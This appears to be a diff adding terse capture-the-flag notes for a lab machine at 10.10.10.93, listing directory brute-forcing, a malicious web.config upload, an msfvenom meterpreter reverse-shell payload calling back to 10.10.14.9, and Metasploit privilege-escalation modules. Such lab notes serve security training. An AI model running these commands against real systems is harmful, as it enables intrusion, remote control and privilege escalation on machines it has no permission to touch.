@@ -1,0 +1,11 @@
+//Based on egre55, IppSec
+gobuster -u http://10.10.10.93 -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -x aspx
+http://10.10.10.93/transfer.aspxpython3 -m http.server	//for web.config
+https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=9001 -f psh -o sh.ps1
+exploit/multi/handler	//9001
+http://10.10.10.93/UploadedFiles/web.config	//got user shell
+
+cmd /c systeminfo				//hotfixes not applied -> kernel exploits
+use multi/recon/local_exploit_suggester
+use windows/local/ms10_092_schelevator		//got root
